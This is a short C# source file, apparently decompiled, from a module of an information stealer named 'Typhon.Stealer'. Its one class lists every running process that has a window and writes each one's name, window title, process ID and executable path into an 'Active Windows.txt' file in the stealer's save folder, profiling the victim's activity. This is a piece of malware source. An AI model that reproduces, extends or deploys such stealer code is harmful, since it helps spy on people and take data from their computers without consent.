using System;
using System.Diagnostics;
using System.IO;

namespace Typhon.Stealer.SystemInfo
{
	// Token: 0x02000008 RID: 8
	internal class SaveOpenedWindows
	{
		// Token: 0x06000023 RID: 35 RVA: 0x000032FC File Offset: 0x000014FC
		public static void SaveActiveWindow(string sSavePath)
		{
			foreach (Process process in Process.GetProcesses())
			{
				try
				{
					if (!string.IsNullOrEmpty(process.MainWindowTitle))
					{
						File.AppendAllText(sSavePath + "\\Active Windows.txt", string.Concat(new string[]
						{
							"PROCESS NAME: ",
							process.ProcessName,
							"\n\tWINDOW TITLE: ",
							process.MainWindowTitle,
							"\n\tPROCESS ID: ",
							process.Id.ToString(),
							"\n\tEXECUTABLE PATH: ",
							SaveRunningProcess.GetProcessExecutablePath(process),
							"\n\n"
						}));
					}
				}
				catch
				{
				}
			}
		}
	}
}
